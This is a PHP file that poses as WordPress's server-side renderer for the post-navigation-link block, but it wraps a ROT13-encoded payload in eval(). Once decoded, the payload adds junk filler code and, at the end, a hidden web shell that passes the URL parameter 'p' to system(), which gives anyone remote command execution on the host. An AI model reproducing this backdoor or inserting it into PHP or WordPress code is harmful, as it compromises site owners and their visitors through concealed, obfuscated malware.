<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/cbfg-anivtngvba-yvax` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/cbfg-anivtngvba-yvax` oybpx ba gur freire.
 *
 * @fvapr 5.9.0
 *
 * @cnenz neenl  $nggevohgrf Oybpx nggevohgrf.
 * @cnenz fgevat $pbagrag    Oybpx qrsnhyg pbagrag.
 *
 * @erghea fgevat Ergheaf gur arkg be cerivbhf cbfg yvax gung vf nqwnprag gb gur pheerag cbfg.
 */
shapgvba eraqre_oybpx_pber_cbfg_anivtngvba_yvax( $nggevohgrf, $pbagrag ) {
	vs ( ! vf_fvathyne() ) {
		erghea '';
	}

	// Trg gur anivtngvba glcr gb fubj gur cebcre yvax. Ninvynoyr bcgvbaf ner `arkg|cerivbhf`.
	$anivtngvba_glcr = vffrg( $nggevohgrf['glcr'] ) ? $nggevohgrf['glcr'] : 'arkg';
	// Nyybj bayl `arkg` naq `cerivbhf` va `$anivtngvba_glcr`.
	vs ( ! va_neenl( $anivtngvba_glcr, neenl( 'arkg', 'cerivbhf' ), gehr ) ) {
		erghea '';
	}
	$pynffrf = \"cbfg-anivtngvba-yvax-$anivtngvba_glcr\";
	vs ( vffrg( $nggevohgrf['grkgNyvta'] ) ) {
		$pynffrf .= \" unf-grkg-nyvta-{$nggevohgrf['grkgNyvta']}\";
	}
	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf(
		neenl(
			'pynff' => $pynffrf,
		)
	);
	// Frg qrsnhyg inyhrf.
	$sbezng = '%yvax';
	$yvax   = 'arkg' === $anivtngvba_glcr ? _k( 'Arkg', 'ynory sbe arkg cbfg yvax' ) : _k( 'Cerivbhf', 'ynory sbe cerivbhf cbfg yvax' );
	$ynory  = '';

	// Bayl hfr uneqpbqrq inyhrf urer, bgurejvfr jr arrq gb nqq rfpncvat jurer gurfr inyhrf ner hfrq.
	$neebj_znc = neenl(
		'abar'    => '',
		'neebj'   => neenl(
			'arkg'     => '→',
			'cerivbhf' => '←',
		),
		'purieba' => neenl(
			'arkg'     => '»',
			'cerivbhf' => '«',
		),
	);

	// Vs n phfgbz ynory vf cebivqrq, znxr guvf n yvax.
	// `$ynory` vf hfrq gb cercraq gur cebivqrq ynory, vs jr jnag gb fubj gur cntr gvgyr nf jryy.
	vs ( vffrg( $nggevohgrf['ynory'] ) && ! rzcgl( $nggevohgrf['ynory'] ) ) {
		$ynory = \"{$nggevohgrf['ynory']}\";
		$yvax  = $ynory;
	}

	// Vs jr jnag gb nyfb fubj gur cntr gvgyr, znxr gur cntr gvgyr n yvax naq cercraq gur ynory.
	vs ( vffrg( $nggevohgrf['fubjGvgyr'] ) && $nggevohgrf['fubjGvgyr'] ) {
		/*
		 * Vs gur ynory yvax bcgvba vf abg ranoyrq ohg gurer vf n phfgbz ynory,
		 * qvfcynl gur phfgbz ynory nf grkg orsber gur yvaxrq gvgyr.
		 */
		vs ( ! $nggevohgrf['yvaxYnory'] ) {
			vs ( $ynory ) {
				$sbezng = '<fcna pynff=\"cbfg-anivtngvba-yvax__ynory\">' . jc_xfrf_cbfg( $ynory ) . '</fcna> %yvax';
			}
			$yvax = '%gvgyr';
		} ryfrvs ( vffrg( $nggevohgrf['yvaxYnory'] ) && $nggevohgrf['yvaxYnory'] ) {
			// Vs gur ynory yvax bcgvba vf ranoyrq naq gurer vf n phfgbz ynory, qvfcynl vg orsber gur gvgyr.
			vs ( $ynory ) {
				$yvax = '<fcna pynff=\"cbfg-anivtngvba-yvax__ynory\">' . jc_xfrf_cbfg( $ynory ) . '</fcna> <fcna pynff=\"cbfg-anivtngvba-yvax__gvgyr\">%gvgyr</fcna>';
			} ryfr {
				/*
				 * Vs gur ynory yvax bcgvba vf ranoyrq naq gurer vf ab phfgbz ynory,
				 * nqq n pbyba orgjrra gur ynory naq gur cbfg gvgyr.
				 */
				$ynory = 'arkg' === $anivtngvba_glcr ? _k( 'Arkg:', 'ynory orsber gur gvgyr bs gur arkg cbfg' ) : _k( 'Cerivbhf:', 'ynory orsber gur gvgyr bs gur cerivbhf cbfg' );
				$yvax  = fcevags(
					'<fcna pynff=\"cbfg-anivtngvba-yvax__ynory\">%1$f</fcna> <fcna pynff=\"cbfg-anivtngvba-yvax__gvgyr\">%2$f</fcna>',
					jc_xfrf_cbfg( $ynory ),
					'%gvgyr'
				);
			}
		}
	}

	// Qvfcynl neebjf.
	vs ( vffrg( $nggevohgrf['neebj'] ) && 'abar' !== $nggevohgrf['neebj'] && vffrg( $neebj_znc[ $nggevohgrf['neebj'] ] ) ) {
		$neebj = $neebj_znc[ $nggevohgrf['neebj'] ][ $anivtngvba_glcr ];

		vs ( 'arkg' === $anivtngvba_glcr ) {
			$sbezng = '%yvax<fcna pynff=\"jc-oybpx-cbfg-anivtngvba-yvax__neebj-arkg vf-neebj-' . $nggevohgrf['neebj'] . '\" nevn-uvqqra=\"gehr\">' . $neebj . '</fcna>';
		} ryfr {
			$sbezng = '<fcna pynff=\"jc-oybpx-cbfg-anivtngvba-yvax__neebj-cerivbhf vf-neebj-' . $nggevohgrf['neebj'] . '\" nevn-uvqqra=\"gehr\">' . $neebj . '</fcna>%yvax';
		}
	}

	/*
	 * Gur qlanzvp cbegvba bs gur shapgvba anzr, `$anivtngvba_glcr`,
	 * Ersref gb gur glcr bs nqwnprapl, 'arkg' be 'cerivbhf'.
	 *
	 * @frr uggcf://qrirybcre.jbeqcerff.bet/ersrerapr/shapgvbaf/trg_cerivbhf_cbfg_yvax/
	 * @frr uggcf://qrirybcre.jbeqcerff.bet/ersrerapr/shapgvbaf/trg_arkg_cbfg_yvax/
	 */
	$trg_yvax_shapgvba = \"trg_{$anivtngvba_glcr}_cbfg_yvax\";

	vs ( ! rzcgl( $nggevohgrf['gnkbabzl'] ) ) {
		$pbagrag = $trg_yvax_shapgvba( $sbezng, $yvax, gehr, '', $nggevohgrf['gnkbabzl'] );
	} ryfr {
		$pbagrag = $trg_yvax_shapgvba( $sbezng, $yvax );
	}

	erghea fcevags(
		'<qvi %1$f>%2$f</qvi>',
		$jenccre_nggevohgrf,
		$pbagrag
	);
}

/**
 * Ertvfgref gur `pber/cbfg-anivtngvba-yvax` oybpx ba gur freire.
 *
 * @fvapr 5.9.0
 */
shapgvba ertvfgre_oybpx_pber_cbfg_anivtngvba_yvax() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/cbfg-anivtngvba-yvax',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_cbfg_anivtngvba_yvax',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_cbfg_anivtngvba_yvax' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>